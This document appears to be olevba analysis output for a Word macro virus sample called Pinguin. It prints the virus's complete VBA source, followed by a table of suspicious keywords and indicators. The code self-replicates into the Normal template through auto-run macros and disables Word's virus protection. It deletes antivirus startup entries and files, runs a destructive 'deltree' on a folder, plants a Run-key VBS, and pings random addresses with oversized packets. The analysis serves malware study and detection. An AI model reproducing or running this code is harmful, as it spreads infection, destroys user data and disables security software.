olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pinguin-7f1efdab6808ce3aa394dbead5d98ad7de2d0ed8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pinguin-7f1efdab6808ce3aa394dbead5d98ad7de2d0ed8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Pinguin.bas 
in file: Virus.MSWord.Pinguin-7f1efdab6808ce3aa394dbead5d98ad7de2d0ed8 - OLE stream: 'Macros/VBA/Pinguin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
'Virus Name: Pinguin[Clau/UC]
'Created By Clau/Ultimate Chaos.
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
'
'
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegQueryValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Declare Function RegDeleteValueA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String) As Long
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Declare Function DeleteFileA Lib "kernel32.dll" (ByVal lpFileName As String) As Long
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Global Const REG_DWORD As Long = 4
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Global Const REG_SZ As Long = 1
Global Const HKEY_CURRENT_USER As Long = &H80000001
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002
Global Const vir_module = "Pinguin"
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Dim k As Long
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Dim s As Long
Dim u As Long
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Dim a As Long
Dim b As String
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Sub AutoNew()
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Infection
End Sub
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Sub AutoOpen()
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Infection
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
End Sub

'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Sub AutoClose()
  Infection
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
End Sub

'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Sub FileSave()
  Infection
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  ActiveDocument.Save
End Sub
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Sub FileSaveAs()
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Dialogs(wdDialogFileSaveAs).Show
  Infection
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Sub Infection()
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Application.ShowVisualBasicEditor = False
  b = "C:\Clau-UC.VXD"
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Poly
  PayLoad
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  On Error Resume Next

'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  WordBasic.DisableAutoMacros 0
  With Options
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    .VirusProtection = False
    .SaveNormalPrompt = False
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    .SavePropertiesPrompt = False
    .ConfirmConversions = False
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  End With
  GlobalInstalled = False
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  DocumentInstalled = False
  For i = 1 To NormalTemplate.VBProject.vbcomponents.Count
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    If NormalTemplate.VBProject.vbcomponents(i).Name = vir_module Then
      GlobalInstalled = True
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    End If
  Next
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  For i = 1 To ActiveDocument.VBProject.vbcomponents.Count
    If ActiveDocument.VBProject.vbcomponents(i).Name = vir_module Then
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
      DocumentInstalled = True
    End If
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Next
  If GlobalInstalled = False Then
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    ActiveDocument.VBProject.vbcomponents.Item(vir_module).export (b)
    NormalTemplate.VBProject.vbcomponents.Import (b)
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    DeleteFileA (b)
    Options.SaveNormalPrompt = False
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  End If
  If DocumentInstalled = False Then
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    NormalTemplate.VBProject.vbcomponents.Item(vir_module).export (b)
    ActiveDocument.VBProject.vbcomponents.Import (b)
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    DeleteFileA (b)
  End If
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Application.DisplayAlerts = wdAlertsAll
End Sub
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Sub PayLoad()
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  
  On Error Resume Next
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Retro
  Randomize Timer
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  
  If Day(Now()) = 1 Then MsgBox "In every 2 of every month of every year" + Chr(13) + "I'll tell you my secret !!!", vbOKOnly, Date
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  If Day(Now()) = 8 Then
    MsgBox "Pinguin Virus Created By Clau/Ultimate Chaos", vbOKOnly, "Secret Info"
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    CommandBars("tools").Controls("Macro").Caption = "Micro"
    CommandBars.ActiveMenuBar.Controls.Item("UC").Delete
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    Set newMenu = CommandBars.ActiveMenuBar.Controls.Add(Type:=msoControlPopup, ID:=1, Temporary:=True)
    newMenu.Caption = "&UC"
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    Set ctrl1 = newMenu.Controls.Add(Type:=msoControlButton, ID:=1)
    ctrl1.Caption = "Pinguin"
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    ctrl1.TooltipText = "Pinguin"
    ctrl1.Style = msoButtonCaption
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    ctrl1.OnAction = "VInfo"
  Else
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    CommandBars.ActiveMenuBar.Controls.Item("UC").Delete
  End If
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  If Int(Rnd * 10) = 1 Then
    Application.Caption = "Pinguin Virus Created By Clau/Ultimate Chaos"
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    Application.DisplayStatusBar = True
    StatusBar = "Pinguin Virus Created By Clau/Ultimate Chaos"
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  End If
  
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  If Int(Rnd * 5) = 1 Then
    ip = Int(255 * Rnd) & "." & Int(255 * Rnd) & "." & Int(255 * Rnd) & "." & Int(255 * Rnd)
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    Shell "ping -l 65000 " & ip, vbHide
  End If
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    
End Sub
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Sub Retro()
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  On Error Resume Next
  Shell "deltree /y c:\aol", vbHide
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, k)
  u = RegDeleteValueA(k, "F-Secure Anti-Virus")
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  u = RegDeleteValueA(k, "F-Secure Gatekeeper")
  u = RegDeleteValueA(k, "IV Interceptor")
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  u = RegDeleteValueA(k, "IV Scheduler")
  u = RegCloseKey(k)
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Kill "c:\windows\start menu\programs\startup\*vir*.*"
  Kill "c:\windows\start menu\programs\startup\avp*.*"
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Open "c:\windows\pinguin.vbs" For Output As #1
  Print #1, "if minute(now())>55 then msgbox " + Chr(34) + "This computer is infected by Pinguin virus !" + Chr(34) + ", vbOKOnly&vbCritical, " + Chr(34) + "Windows Alert Level : 3" + Chr(34)
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Close #1
  System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Pinguin") = "C:\Windows\Pinguin.VBS"
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
End Sub

'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Sub VInfo()
  MsgBox "Clau[UC].Pinguin virus created by" + Chr(13) + "Clau member of Ultimate Chaos"
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
End Sub

'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Sub ViewVBcode()
End Sub
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Sub ToolsMacro()
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
End Sub

'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Sub ToolsCustomize()
End Sub
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Sub ToolsOptions()
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
End Sub

'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
Sub FileTemplates()
End Sub
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12

Sub Poly()
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Dim s As String
  On Error Resume Next
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  Randomize Timer
  s = Now: s = "'#" + s + s + s + s
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  y = Application.VBE.ActiveVBProject.vbcomponents.Item(vir_module).CodeModule.CountOfLines
  With Application.VBE.ActiveVBProject.vbcomponents.Item(vir_module).CodeModule
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    For i = 1 To y * 2 Step 3
      If Mid(.Lines(i, 1), 1, 2) = "'#" Then .ReplaceLine i, s
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
    Next
  End With
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
  NormalTemplate.Save
  ActiveDocument.Save
'#01.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:1201.01.99 12:36:12
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |pinguin.vbs         |Executable file name                         |
|IOC       |Pinguin.VBS         |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
